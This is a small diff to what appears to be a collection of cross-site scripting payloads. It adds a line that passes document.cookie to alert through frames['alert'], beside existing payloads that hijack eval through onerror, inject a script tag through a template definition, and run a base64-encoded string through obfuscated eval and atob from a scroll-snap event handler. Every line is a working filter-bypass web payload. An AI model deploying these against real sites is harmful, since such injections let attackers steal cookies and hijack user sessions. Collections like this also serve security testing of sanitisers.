@@ -83,3 +83,4 @@ confirm?.(1)
 <img/src/onerror=window.onerror=eval;http://ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>
 {{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
 <address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
+frames['alert'](document["cookie"])>
